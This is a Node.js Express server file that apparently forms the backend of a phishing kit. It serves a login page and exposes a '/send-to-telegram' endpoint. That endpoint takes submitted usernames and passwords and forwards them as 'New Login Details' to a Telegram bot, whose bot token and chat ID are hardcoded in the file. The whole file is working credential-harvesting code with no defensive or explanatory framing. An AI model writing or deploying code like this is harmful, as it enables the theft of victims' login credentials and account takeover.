const express = require('express');
const axios = require('axios');
const path = require('path'); // Add this line
const app = express();
const PORT = 3000;

// Serve static files (like index.html)
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to parse JSON
app.use(express.json());

// Replace with your bot token and chat ID
const BOT_TOKEN = '7045803250:AAFBGgQHWXdlXDfo6YYYafwYzPn4m4pGSNc';
const CHAT_ID = '5605345504';

// Endpoint to handle form submission
app.post('/send-to-telegram', async (req, res) => {
    const { username, password } = req.body;

    // Create the message to send
    const message = `New Login Details:\nUsername: ${username}\nPassword: ${password}`;

    try {
        // Send the message to Telegram
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
        });
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        res.status(500).json({ success: false });
    }
});

// Serve index.html for the root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
